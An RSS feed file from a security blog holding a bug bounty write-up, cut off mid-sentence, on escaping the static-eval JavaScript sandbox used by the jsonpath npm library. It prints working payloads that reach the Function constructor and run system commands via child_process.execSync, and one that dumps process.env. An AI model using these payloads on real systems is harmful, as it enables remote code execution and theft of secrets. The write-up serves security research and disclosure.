@@ -1,0 +1,356 @@
+<?xml version="1.0" encoding="utf-8"?>
+<?xml-stylesheet type="text/xsl" href="../../assets/xml/rss.xsl" media="all"?><rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Licencia para Hackear (Posts about bug bounty)</title><link>https://licenciaparahackear.github.io/</link><description></description><atom:link href="https://licenciaparahackear.github.io/en/categories/bug-bounty.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><copyright>Contents © 2019 &lt;a href="mailto:pub@matiaslang.me"&gt;Matías Lang&lt;/a&gt; 
+&lt;a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"&gt;&lt;img alt="Licencia Creative Commons" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" /&gt;&lt;/a&gt;&lt;br /&gt;Esta obra está bajo una &lt;a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"&gt;Licencia Creative Commons Atribución-CompartirIgual 4.0 Internacional&lt;/a&gt;.
+</copyright><lastBuildDate>Fri, 01 Mar 2019 21:04:50 GMT</lastBuildDate><generator>Nikola (getnikola.com)</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>Bypassing a restrictive JS sandbox</title><link>https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/</link><dc:creator>Matías Lang</dc:creator><description>&lt;div&gt;&lt;p&gt;While participating in a bug bounty program, I found a site with a very
+interesting functionality: it allowed me to filter some data based on a
+user-controlled expression. I could put something like &lt;code&gt;book.price &amp;gt; 100&lt;/code&gt; to
+make it only show the books that are more expensive than $100. Using &lt;code&gt;true&lt;/code&gt; as
+filter showed me all the books, and &lt;code&gt;false&lt;/code&gt; didn't show anything.  So I was
+able to know whether the expression I used was evaluating to true or false.&lt;/p&gt;
+&lt;p&gt;That functionality caught my attention so I tried passing it more complex
+expressions, like &lt;code&gt;(1+1).toString()==="2"&lt;/code&gt; (evaluated to true) and
+&lt;code&gt;(1+1).toString()===5&lt;/code&gt; (evaluated to false). This is clearly JavaScript code,
+so I guessed that the expression was being used as an argument to a function
+similar to &lt;code&gt;eval&lt;/code&gt;, inside a NodeJS server. It seemed like I was close to find
+a Remote Code Execution vulnerability. However, when I used more complex
+expressions, I was getting an error saying that they were invalid. I guessed
+that it wasn't the &lt;code&gt;eval&lt;/code&gt; function that parsed the expression, but a kind
+of sandbox system for JavaScript.&lt;/p&gt;
+&lt;p&gt;Sandbox systems used to execute untrusted code inside a restricted environment
+are usually hard to get right. In most cases there exist ways to bypass this
+protections to be able to execute code with normal privileges. This is
+specially true if they try to limit the usage of complex, feature bloated
+languages like JavaScript. The problem had already caught my attention, so I
+decided spend my time trying to break this sandbox system. I would learn about
+JavaScript internals, and gain some bucks in case of finding and exploiting the
+RCE.&lt;/p&gt;
+&lt;p&gt;The first thing I did was identify what library the site was using to implement
+the sandbox, given that the NodeJS ecosystem is known for having tens of
+libraries that do the same thing, and in many cases all of them are doing it
+wrong. Maybe it was a custom sandbox library used only for the target site, but
+I discarded this possibility because it was really unlikely that the developers
+spent their time doing this kind of things.&lt;/p&gt;
+&lt;p&gt;Finally, by analyzing the app error messages I concluded that they were using
+&lt;a href="https://github.com/substack/static-eval"&gt;static-eval&lt;/a&gt;, a not very known library (but written by
+&lt;a href="https://twitter.com/substack"&gt;substack&lt;/a&gt;, somebody well known in the NodeJS community). Even if the
+original purpose of the library wasn't to be used as a sandbox (I still don't
+understand what it was created for), its documentation suggests that. In the
+case of the site I was testing, it certainly was being used as a sandbox.&lt;/p&gt;
+&lt;h3&gt;Breaking static-eval&lt;/h3&gt;
+&lt;p&gt;The idea of static-eval is to use the &lt;a href="https://github.com/jquery/esprima/"&gt;esprima&lt;/a&gt; library to parse the
+JS expression and convert it to an &lt;a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree"&gt;AST (Abstract Syntax Tree)&lt;/a&gt;. Given
+this AST and an object with the variables I want to be available inside the
+sandbox, it tries to evaluate the expression. If it finds something strange,
+the function fails and my code isn't executed. At first I was a bit demotivated
+because of this, since I realized that the sandbox system was very restrictive
+with what it accepted. I wasn't even able to use a &lt;code&gt;for&lt;/code&gt; or &lt;code&gt;while&lt;/code&gt; statement
+inside my expression, so doing something that required an iterative algorithm
+was almost impossible. Anyway, I kept trying to find a bug in it.&lt;/p&gt;
+&lt;p&gt;I did not find any bug at first sight, so I looked at the commits and pull
+requests of the &lt;a href="https://github.com/substack/static-eval"&gt;static-eval GitHub project&lt;/a&gt;. I found that the
+&lt;a href="https://github.com/substack/static-eval/pull/18"&gt;pull request #18&lt;/a&gt; fixed two bugs that allowed a sandbox escape
+in the library, exactly what I was looking for. I also found &lt;a href="https://maustin.net/articles/2017-10/static_eval"&gt;a blog post of
+the pull request author&lt;/a&gt; that explained this vulnerabilities
+in depth. I immediately tried using this techniques in the site I was testing,
+but unfortunately to me, they were using a newer static-eval version that
+already patched this vulns. However, knowing that somebody has already been
+able to break this library made me more confident so I kept looking for new
+ways to bypass it.&lt;/p&gt;
+&lt;p&gt;Then, I analyzed this two vulns in depth, hoping this could inspire me to find
+new vulnerabilities in the library.&lt;/p&gt;
+&lt;h3&gt;Analysis of the first vulnerability&lt;/h3&gt;
+&lt;p&gt;The first vuln used the &lt;a href="https://developer.mozilla.org/es/docs/Web/JavaScript/Referencia/Objetos_globales/Function"&gt;function constructor&lt;/a&gt; to make a malicious
+function. This technique is frequently used to bypass sandboxes. For example,
+most of &lt;a href="https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs"&gt;the ways to bypass the angular.js sandbox to get an
+XSS&lt;/a&gt; use payloads that end up accessing and calling the
+function constructor. It was also used to &lt;a href="https://github.com/patriksimek/vm2/issues/32"&gt;bypass libraries similar to
+static-eval, like vm2&lt;/a&gt;. The following expression shows the
+existence of the vulnerability by printing the system environment variables
+(this shouldn't be possible because the sandbox should block it):&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"console.log(process.env)"&lt;/span&gt;&lt;span class="p"&gt;)()&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;In this code, &lt;code&gt;"".sub&lt;/code&gt; is a short way to obtain a function (&lt;code&gt;(function(){})&lt;/code&gt;
+would also work).  Then it access to the constructor of that function. That is
+a function that when called returns a new function whose code is the string
+passed as argument. This is like the eval function, but instead of executing
+the code immediately, it returns a function that will execute the code when
+called. That explains the &lt;code&gt;()&lt;/code&gt; at the end of the payload, that calls the
+created function.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Result of executing the previous payload" src="https://licenciaparahackear.github.io/images/static-eval/constructor-bypass.png" title="Result of executing the previous payload"&gt;&lt;/p&gt;
+&lt;p&gt;You can do more interesting things than showing the environment variables.  For
+example, you can use the &lt;code&gt;execSync&lt;/code&gt; function of the &lt;code&gt;child_process&lt;/code&gt; NodeJS
+module to execute operating system commands and return its output. This payload
+will return the output of running the &lt;code&gt;id&lt;/code&gt; command:&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())"&lt;/span&gt;&lt;span class="p"&gt;)()&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;The payload is similar to the previous one, except for the created function's
+body.  In this case, &lt;code&gt;global.process.mainModule.constructor._load&lt;/code&gt; does the
+same as the &lt;code&gt;require&lt;/code&gt; function of NodeJS. For some reason I ignore, this
+function isn't available with the name &lt;code&gt;require&lt;/code&gt; inside the function
+constructor, so I had to use that ugly name.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Result of executing the payload that runs the id command in the system" src="https://licenciaparahackear.github.io/images/static-eval/constructor-execsync.png" title="Result of executing the payload that runs the `id` command in the system"&gt;&lt;/p&gt;
+&lt;p&gt;The fix for this vulnerability consisted in blocking the access to properties
+of objects that are a function (this is done with &lt;code&gt;typeof obj == 'function'&lt;/code&gt;):&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;node&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;type&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s1"&gt;'MemberExpression'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;walk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;node&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="c1"&gt;// do not allow access to methods on Function &lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="nx"&gt;FAIL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="nx"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'function'&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;FAIL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;This was a very simple fix, bit it worked surprisingly well. The function
+constructor is available, naturally, only in functions. So I can't get access
+to it. An object's &lt;code&gt;typeof&lt;/code&gt; can't be modified, so anything that is a function
+will have its &lt;code&gt;typeof&lt;/code&gt; set a &lt;code&gt;function&lt;/code&gt;. I didn't find a way to bypass this
+protection, so I looked at the second vuln.&lt;/p&gt;
+&lt;h3&gt;Analysis of the second vuln&lt;/h3&gt;
+&lt;p&gt;This vuln was way more simple and easy to detect than the first one: the
+problem was that the sandbox allowed the creation of anonymous functions, but
+it didn't check their body to forbid malicious code. Instead, the body of the
+function was being directly passed to the function constructor.  The following
+code has the same effect than the first payload of the blog post:&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;)})()&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;You can also change the body of the anonymous function so it uses &lt;code&gt;execSync&lt;/code&gt;
+to show the output of executing a system command. I'll leave this as an
+exercise for the reader.&lt;/p&gt;
+&lt;p&gt;One possible fix for this vulnerability would be to forbid all anonymous
+function declarations inside static-eval expressions. However, this would block
+the legitimate use cases of anonymous functions (for example, use it to map
+over an array). Because of this, the fix would have to allow the usage of
+benign anonymous functions, but to block the usage of malicious ones.  This is
+done by analyzing the body of the function when it is defined, to check it
+won't perform any malicious actions, like accessing the function constructor.&lt;/p&gt;
+&lt;p&gt;This fix turned out to be more complex than the first one. Also, Matt Austin
+(the author of the fix) said he wasn't sure it would work perfectly. So I
+decided to find a bypass this fix.&lt;/p&gt;
+&lt;h3&gt;Finding a new vulnerability&lt;/h3&gt;
+&lt;p&gt;One thing that caught my attention was that static-eval decided whether the
+function was malicious or not at definition time, and not when it was being
+called.  So it didn't consider the value of the function arguments, because
+that would require to make the check when the function is called instead.&lt;/p&gt;
+&lt;p&gt;My idea was always trying to access the function constructor, in a way that
+bypasses the first fix that forbids that (because I'm not able to access
+properties of functions). However, what would happen if I try to access the
+constructor of a function parameter? Since its value isn't known at definition
+time, maybe this could confuse the system and make it allow that. To test my
+theory, I used this expression:&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;something&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;something&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;})(&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;If that returned the function constructor, I would have a working bypass. Sadly
+for me, it wasn't the case. static-eval will block the function if it accesses
+a property of something with an unknown type at function definition time (in
+this case, the &lt;code&gt;something&lt;/code&gt; argument).&lt;/p&gt;
+&lt;p&gt;One useful feature of static-eval that is used in almost all cases, is allowing
+to specify some variables you want to be available inside the static-eval
+expression. For example, in the beginning of the blog post I used the expression
+&lt;code&gt;book.price &amp;gt; 100&lt;/code&gt;. In this case, the code calling static eval will pass it the
+value of the &lt;code&gt;book&lt;/code&gt; variable so it can be used inside the expression.&lt;/p&gt;
+&lt;p&gt;This gave me another idea: what would happen if I make an anonymous function
+with an argument whose name is the same as an already defined variable?  Since
+it can't know the value of the argument at definition time, maybe it uses the
+initial value of the variable. That would be very useful to me.  Suppose I have
+a variable &lt;code&gt;book&lt;/code&gt; and its initial value is an object. Then, the following
+expression:&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;})(&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;would have a very satisfactory result: when the function is defined,
+static-eval would check if &lt;code&gt;book.constructor&lt;/code&gt; is a valid expression.  Since
+&lt;code&gt;book&lt;/code&gt; is initially an object (whose typeof is &lt;code&gt;object&lt;/code&gt;) and not a function,
+accessing to its constructor is allowed and the function will be created.
+However, when I call this function, &lt;code&gt;book&lt;/code&gt; will take the value passed as
+argument to the function (this is &lt;code&gt;"".sub&lt;/code&gt;, another function). Then it will
+access and return its constructor, effectively returning the function
+constructor.&lt;/p&gt;
+&lt;p&gt;Sadly, this didn't work either because the author of the fix considered this
+case. At the moment of analyzing the function's body, the value of all its
+arguments it set to &lt;code&gt;null&lt;/code&gt;, overriding the initial value of the variables. This
+is a fragment of the code doing that:&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;node&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;forEach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'Identifier'&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+      &lt;span class="nx"&gt;vars&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;});&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;This code takes the AST node that defines the function, iterates over each of
+its parameters whose type is &lt;code&gt;Identifier&lt;/code&gt;, takes its name and sets to null the
+attribute of &lt;code&gt;vars&lt;/code&gt; with that name. Even if the code looks correct, it has a
+very common bug: it doesn't cover all possible cases. What would happen if an
+argument is something strange and its type isn't &lt;code&gt;Identifier&lt;/code&gt;? instead of
+doing something sane and saying &lt;em&gt;"I don't know what this is, so I'll block the
+entire function"&lt;/em&gt; (like in a whitelist), it will ignore that argument and
+continue with the rest (like a blacklist). This means that if I make a node
+representing a function argument have a type different from &lt;code&gt;Identifier&lt;/code&gt;, the
+value of the variable with that name won't be overwritten, so it would use the
+initial value. At this time I was pretty confident that I found something
+important.  I only needed to find how to set the &lt;code&gt;key.type&lt;/code&gt; to something
+different from &lt;code&gt;Identifier&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;As I commented before, static-eval uses &lt;a href="https://github.com/jquery/esprima/"&gt;the esprima library&lt;/a&gt; to parse
+the code we give to it. According to its documentation, esprima is a parser
+that fully supports the &lt;a href="https://www.ecma-international.org/ecma-262/7.0/"&gt;ECMAScript standard&lt;/a&gt;. ECMAScript is something
+like a dialect of JavaScript with more features, that makes its syntax more
+comfortable to the user&lt;sup id="fnref-ecma-disclaimer"&gt;&lt;a class="footnote-ref" href="https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/#fn-ecma-disclaimer"&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;p&gt;One feature that was added to ECMAScript is &lt;a href="https://simonsmith.io/destructuring-objects-as-function-parameters-in-es6/"&gt;function parameter
+destructuring&lt;/a&gt;.  With this feature, the following JS code is now
+valid:&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;lastName&lt;/span&gt;&lt;span class="p"&gt;}){&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;firstName&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;" "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;firstName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"John"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;lastName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"McCarthy"&lt;/span&gt;&lt;span class="p"&gt;}))&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;The curly braces inside the definition of the function arguments indicate that
+the function doesn't take two arguments &lt;code&gt;firstName&lt;/code&gt; and &lt;code&gt;lastName&lt;/code&gt;. Instead, it
+takes just one argument that is an object that must have the &lt;code&gt;firstName&lt;/code&gt; and
+&lt;code&gt;lastName&lt;/code&gt; properties.  The previous code is equivalent to the following:&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;person&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;firstName&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;" "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;firstName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"John"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;lastName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"McCarthy"&lt;/span&gt;&lt;span class="p"&gt;}))&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;If we see the AST generated by esprima (I did it by using &lt;a href="http://esprima.org/demo/parse.html"&gt;this tool&lt;/a&gt;),
+we will have a very satisfactory result:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Result of parsing the function using parameter destructuring" src="https://licenciaparahackear.github.io/images/static-eval/esprima-online-parser.png"&gt;&lt;/p&gt;
+&lt;p&gt;Indeed, this new syntax makes the function argument have a &lt;code&gt;key.type&lt;/code&gt; different from
+&lt;code&gt;Identifier&lt;/code&gt;, so static-eval won't use it when it overrides the variables. This way,
+when evaluating&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;}){&lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;})({&lt;/span&gt;&lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;static-eval will use the initial value of &lt;code&gt;book&lt;/code&gt;, that is an object. Then, it
+allows the creation of the function. But when it is called, book will be a
+function, so the function constructor is now returned. I found the bypass!&lt;/p&gt;
+&lt;p&gt;The previous expression returns the function constructor, so I only have
+to call it to create a malicious function, and then call this created
+function:&lt;/p&gt;
+&lt;pre class="code literal-block"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;}){&lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;})({&lt;/span&gt;&lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;})(&lt;/span&gt;&lt;span class="s2"&gt;"console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())"&lt;/span&gt;&lt;span class="p"&gt;)()&lt;/span&gt;
+&lt;/pre&gt;
+
+
+&lt;p&gt;I tried evaluating this expression in a local environment with the last version
+of static-eval, and I got what I was expecting:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Final working exploit" src="https://licenciaparahackear.github.io/images/static-eval/exploit-final.png"&gt;&lt;/p&gt;
+&lt;p&gt;Mission accomplished! I found a bypass to the static-eval library allowing me
+to get code execution in the machine that uses it. The only required condition
+to make it work was knowing the name of a variable whose value isn't a
+function, and that has a &lt;code&gt;constructor&lt;/code&gt; attribute. Both strings, numbers, arrays
+and objects fulfill this property, so it should be easy to achieve this
+condition. I only needed to use this technique in the site I was testing, get a
+PoC of the RCE and claim my money. Pretty simple. Or maybe not?&lt;/p&gt;
+&lt;h2&gt;Discovering that the exploit didn't work in my target&lt;/h2&gt;
+&lt;p&gt;Unfortunately, not. After doing all this work and find an elegant and
+functional bypass, I realized that it was not going to work in the site I was
+testing.  The only condition required was to have the name of a variable whose
+value isn't a function, so you might be thinking I couldn't get it to make my
+technique work. However, it did satisfy this condition. The reason it didn't
+work is even more bizarre.&lt;/p&gt;
+&lt;p&gt;To give some context, the site wasn't using static-eval directly. It was using
+it through the &lt;a href="https://github.com/dchester/jsonpath"&gt;jsonpath&lt;/a&gt; npm library. JSONPath is a query language
+with the same purpose as XPATH but made for JSON documents instead of XML ones.
+It was initially published in 2007 in &lt;a href="https://goessner.net/articles/JsonPath/"&gt;this article&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;After reading the JSONPath documentation, I realized that it is a very poor
+project, with a really vague specification about how it should work. Most of
+the features it implements were probably made in an afterthought, without
+properly considering if adding them was worth it, or if it was just a bad idea.
+It's a shame that the NodeJS ecosystem is full of libraries like this one.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="https://licenciaparahackear.github.io/images/static-eval/npm-install.jpeg"&gt;&lt;/p&gt;
+&lt;p&gt;JSONPath has a feature called filter expressions, that allows filtering
+documents that match a given expression. For example, &lt;code&gt;$.store.book[?(@.price &amp;lt;
+10)].title&lt;/code&gt; will get the books cheaper than $10, and then get their title. In
+the case of the jsonpath npm library, the expression between parenthesis is
+evaluated using static-eval. The site I was testing allowed me to specify a
+JSONPath expression and parsed it with that library, so the RCE there was
+evident.&lt;/p&gt;
+&lt;p&gt;If we see the previous JSONPath expression in detail, we can see that the
+expression passed to static-eval is &lt;code&gt;@.price &amp;lt; 10&lt;/code&gt;. According to the
+documentation, &lt;code&gt;@&lt;/code&gt; is a variable containing the document being filtered
+(usually it is an object). Unfortunately, the creator of JSONPath had the idea
+to name this variable &lt;code&gt;@&lt;/code&gt;. According to the ECMAScript specification, this isn't
+a valid variable name. So to make static-eval work, they had to do a horrible
+thing that is &lt;a href="https://github.com/dchester/jsonpath/blob/87f97be392870c469308dd4dc90d2067863ea02a/lib/aesprim.js#L8"&gt;patching the esprima code so it considers &lt;code&gt;@&lt;/code&gt; as a valid
+variable name&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;When you create an anonymous function in static-eval, it is embedded into
+another function that takes as argument the already defined variables. So if I
+create an anonymous function inside a JSONPath filter expression, it will
+create a function wrapping it that takes an argument named &lt;code&gt;@&lt;/code&gt;. This is done by
+directly calling the function constructor, so it doesn't use the esprima patch
+of before. Then, when defining the function, it'll throw an error that I won't
